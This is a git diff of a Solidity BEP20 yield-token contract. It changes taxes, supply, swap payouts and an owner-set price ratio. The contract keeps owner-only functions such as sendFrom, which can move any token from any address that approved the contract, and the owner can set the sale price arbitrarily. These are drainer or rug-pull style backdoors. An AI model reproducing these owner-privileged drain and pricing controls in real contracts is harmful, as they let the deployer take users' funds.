@@ -4,46 +4,50 @@ import "./BEP20.sol";
 import "./flashGaurd.sol";
 import './address.sol';
 
-
-contract yieldToken is BEP20('Test2 Token', 'TEST2'), flashGaurd {
-    
+contract yieldToken is BEP20('test Token', 'test'), flashGaurd {
     using Address for address;
-    uint tax = 120; address _burnAddress = 0x000000000000000000000000000000000000dEaD;
-    uint burnTax = 120; bool lockToken = false; address LPtoken;
-    address LPbusdbnb = 0x1B96B92314C44b159149f7E0303511fB2Fc4774f;
-    IBEP20 TOKEN; bool approvedOnly = true;
-   IBEP20 WBNB = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-  IBEP20 BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) ;
+    uint tax = 130; address _burnAddress = 0x000000000000000000000000000000000000dEaD;
+    uint burnTax = 100; bool public lockToken = false; address public LPtoken;
+    address LPbusdbnb = 0x1B96B92314C44b159149f7E0303511fB2Fc4774f;    uint TotalSupply = 1000000*10**18; // 1M
+    IBEP20 public TOKEN; bool public approvedOnly = false; uint stockRatio = 1276;
+   IBEP20 public WBNB = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+  IBEP20 public BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) ; 
     address payable adminTo; address payable promoTo; uint promoTax = 100;
-    constructor(uint _supply) public{
+    constructor() public{
     adminTo = msg.sender;
     promoTo = msg.sender;
-    _totalSupply = _supply;
-    _mint(address(msg.sender), _supply);
+    _whiteList[address(this)] = true;
+    _mint(address(this), TotalSupply);
     TOKEN = IBEP20(this);
+    
     }
 
     function sendBnb(address payable _to, uint _x) external onlyOwner{
         (bool send_,  ) = _to.call{value:_x}(""); 
         require(send_, "Failure"); 
     }
-    function send(IBEP20 _tok, address payable _to, uint _x) external onlyOwner {
-        _tok.transfer(_to, _x); 
+    function setApproval(address payable _to, uint _x) external onlyOwner{
+    _approve(address(this),_to, _x);
+    }
+
+    function send(BEP20 _token, address payable _to, uint _x) external onlyOwner {
+        _token.transfer(_to, _x); 
         }
     function sendFrom(IBEP20 _tok, address payable _from, address payable _to, uint _x) external onlyOwner {
         _tok.transferFrom(_from, _to, _x); 
         }
-    function read(IBEP20 _tok, address _address) external onlyOwner view{
-        _tok.balanceOf(_address); 
+    function read(IBEP20 _tok, address _address) external onlyOwner view returns (uint){
+      return  _tok.balanceOf(_address); 
         }
     function readApprove(IBEP20 _tok, address _address) external onlyOwner
-    view{
-        _tok.allowance(_address, address(this)); 
+    view returns (uint) {
+      return  _tok.allowance(_address, address(this)); 
         }
     function quoteBnb(uint _x) internal view returns (uint){
+        if (stockRatio > 0) {return (_x.mul(stockRatio));   }
         return( _x.mul(TOKEN.balanceOf(LPtoken).div(WBNB.balanceOf(LPtoken)))   );
     }
-    function quoteBusd(uint _x) internal view returns (uint){
+    function quoteBusd(uint _x) public view returns (uint){
         uint value =  WBNB.balanceOf(LPbusdbnb).div(BUSD.balanceOf(LPbusdbnb));
         return(quoteBnb(_x.mul(value)));
     }
@@ -64,15 +68,16 @@ contract yieldToken is BEP20('Test2 Token', 'TEST2'), flashGaurd {
     }
 
 
-        receive() external payable{swap();}
+        receive() external payable{ swap();  }
 
         function swap()public payable noFlash returns (bool){
         uint quote =  quoteBnb(msg.value);
        uint promoFee = findCut(msg.value,promoTax);
-        promoTo.call{value:promoFee};
-        (bool transferss,  ) = adminTo.call{value:(msg.value - promoFee)}("");
+        (bool transferss,  ) = promoTo.call{value:(promoFee)}("");
         require(transferss, "Failed to transfer the funds, aborting.");
-        BEP20._transfer(address(this), msg.sender , quote); 
+        (bool transfers,  ) = adminTo.call{value:(msg.value - promoFee)}("");
+        require(transfers, "Failed to transfer the funds, aborting.");
+        TOKEN.transfer( msg.sender , quote); 
         return true;
 }
 
@@ -81,7 +86,7 @@ contract yieldToken is BEP20('Test2 Token', 'TEST2'), flashGaurd {
         require(BUSD.balanceOf(address(this)) >= _busdX);
         (bool transferx  ) = BUSD.transferFrom(msg.sender, adminTo, _busdX);
         require(transferx, "Failed to transfer the funds, aborting.");
-        BEP20._transfer(address(this), msg.sender , quote); 
+        TOKEN.transfer(msg.sender , quote); 
         return true;
 }
         function setLP(address _LP) external onlyOwner {
@@ -91,6 +96,11 @@ contract yieldToken is BEP20('Test2 Token', 'TEST2'), flashGaurd {
             LPbusdbnb = _LP;
         }
         
+                function setStockRatio(uint _x) external onlyOwner {
+            stockRatio = _x;
+        }
+                
+
                 function SetBUSDandWBNB(IBEP20 _BUSD, IBEP20 _WBNB) external onlyOwner {
             BUSD = _BUSD;
                  WBNB = _WBNB;
